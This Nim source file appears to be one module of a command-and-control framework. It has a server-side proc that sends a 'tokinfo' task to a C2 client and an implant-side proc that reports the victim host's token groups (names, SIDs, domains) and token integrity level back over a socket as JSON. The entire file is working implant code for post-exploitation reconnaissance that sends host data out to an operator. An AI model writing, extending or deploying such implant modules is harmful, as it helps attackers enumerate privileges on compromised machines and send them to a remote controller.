when defined(server):
  import asyncdispatch
  import ../server/[types, communication]

when defined(client):
  import std/[osproc, os, net, json, jsonutils]
  import ../client/communication

when defined(server):
  proc sendTask*(client: C2Client): Future[Task] {.async.} =
    return await client.sendClientTask("tokinfo")

when defined(client):
  proc executeTask*(socket: Socket, taskId: int, 
    tokenGroups: seq[tuple[name, sid, domain: string]],
    tokenIntegrity: string) =

    socket.sendOutput(taskId, "TOKENINFO", 
      $(%*{
        "tokenGroups": toJson tokenGroups,
        "tokenIntegrity": tokenIntegrity
      })
    )
